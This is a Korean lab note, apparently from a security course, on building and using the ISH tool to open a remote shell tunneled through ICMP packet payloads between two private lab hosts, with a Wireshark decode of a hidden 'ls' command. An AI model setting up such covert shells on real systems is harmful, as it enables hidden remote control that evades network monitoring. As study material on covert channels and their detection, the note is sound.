# ISH 은닉채널 

- 은닉채널(Covert Channel)은 정상적인 네트워크 통신이 아닌,  
  **탐지되지 않도록 숨겨진 경로를 이용해 데이터를 전달하는 통신 방식**입니다.

- 일반 통신처럼 보이지만 실제로는 **숨겨진 데이터 전송**이 이루어집니다.
- ISH는 ICMP 패킷의 Payload 영역에 명령어 및 데이터를 숨겨 통신하는 도구입니다.

---

## 환경 구성

- ISH Server : 192.168.11.17
- ISH Client : 192.168.11.36

### 설치 과정

- `http://sourceforge.net/projects/icmpshell/` 링크를 통해 설치합니다.
  - Server와 Client 모두 설치해야 합니다. 

- 다음 명령어를 통해 설치를 합니다.
```
tar xvfz ish-v0.2.tar.gz

cd ISHELL-v0.2/

make linux
```

- make linux 명령어가 안될 시 다음 명령어중 설치 타입에 맞춰 입력해줍니다.
```
yum install-y gcc

dnf install-y gcc

apt install -y build-essential

: gcc-c++ make binutils glibc-devel libstdc++-devel gdb utoconf automake bison flex
cmake pkgconfig strace 
```

- Linux 설치 타입에 따라 컴파일러 관련 패키지를 설치 해야 하는 경우도 있습니다.

## Server

- 서버에서 다음 명령어를 실행합니다.
```
./ishd

ps -ax | grep ishd //프로세스 확인
```

![07](/KH_Security/모의%20해킹/터널링%20%26%20은닉채널/img/07.png)

- ishd를 서버에서 실행합니다.
- ps -ax | grep ishd : 현재 실행 중인 프로세스 확인하며, ishd가 살아있는지 체크합니다.

## Client

- 다음 명령어를 통해 서버에 연결합니다.
```
./sih 192.168.11.17
```

- 연결 성공 후 클라이언트에서 다음 명령어를 입력합니다.
```
ip a
```

![08](/KH_Security/모의%20해킹/터널링%20%26%20은닉채널/img/08.png)

- ICMP를 이용하여 원격 시스템에서 명령을 실행하는 은닉채널 기반 쉘 접속입니다.

![09](/KH_Security/모의%20해킹/터널링%20%26%20은닉채널/img/09.png)

- 서버에서 원격으로 다음 명령어 입력을 해보았을 때,
  클라이언트에서 경로를 확인 했을 때 서버의 현재 경로가 출력됩니다.

![10](/KH_Security/모의%20해킹/터널링%20%26%20은닉채널/img/10.png)

### Payload

```plaintext
Data (31 bytes):
0000000000000000000000000000000000000020000000000069640a
```

- 
```plaintext
6c 73 0a → "ls\n"
```
- Wireshark 캡처 패킷에서 ICMP Payload를 분석한 결과 **"ls" 명령어가 포함된 은닉채널 통신**이 확인됩니다.
- ICMP payload에 "ls" 명령어가 포함된 원격 쉘 통신입니다.
